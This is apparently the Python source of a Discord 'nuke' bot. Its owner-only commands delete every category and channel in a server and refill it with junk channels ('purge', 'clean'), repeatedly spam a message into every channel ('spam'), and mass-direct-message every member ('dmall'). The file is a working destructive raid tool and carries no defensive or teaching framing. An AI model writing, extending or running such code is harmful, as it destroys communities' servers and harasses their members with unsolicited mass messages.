import discord
from discord.ext import commands
import json
import asyncio
import os
import discord.ui
from discord.ui import select, view

intents = discord.Intents.all()
prefix = "+"

bot = commands.Bot(command_prefix="+", intents=intents)

@bot.command(name='purge')
async def purge(ctx, number: int, name: str):
    with open('owners.txt', 'r') as f:
        owners = [line.strip() for line in f.readlines()]
    if str(ctx.author.id) not in owners:
        print(f"{ctx.author} is not an owner of the bot")
        return
    
    for category in ctx.guild.categories:
        await category.delete()
    for channel in ctx.guild.channels:
        await channel.delete()

    for i in range(number):
        await ctx.guild.create_text_channel(f"{name}")

@bot.command(name='clean')
async def clean(ctx):
    with open('owners.txt', 'r') as f:
        owners = [line.strip() for line in f.readlines()]
    if str(ctx.author.id) not in owners:
        print(f"{ctx.author} is not an owner of the bot")
        return
    
    for category in ctx.guild.categories:
        await category.delete()
    for channel in ctx.guild.channels:
        await channel.delete()
    
    await ctx.guild.create_text_channel("cleaned")

@bot.command(name='spam')
async def spam(ctx, nb_spam: int, *, message: str):
    with open('owners.txt', 'r') as f:
        owners = [line.strip() for line in f.readlines()]
    if str(ctx.author.id) not in owners:
        print(f"{ctx.author} is not an owner of the bot")
        return
    for _ in range(nb_spam):
        for channel in ctx.guild.channels:
            try:
                await channel.send(message)
            except discord.Forbidden:
                print(f"Impossible to send a message to {channel.name}")

@bot.command(name='dmall')
async def dmall(ctx, *, message: str):
    with open('owners.txt', 'r') as f:
        owners = [line.strip() for line in f.readlines()]
    if str(ctx.author.id) not in owners:
        print(f"{ctx.author} is not an owner of the bot")
        return
    
    members = ctx.guild.members
    for member in members:
        try:
            await member.send(message.replace('{user}', member.mention))
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message à {member.name}")

bot.run('TOKEN_HERE')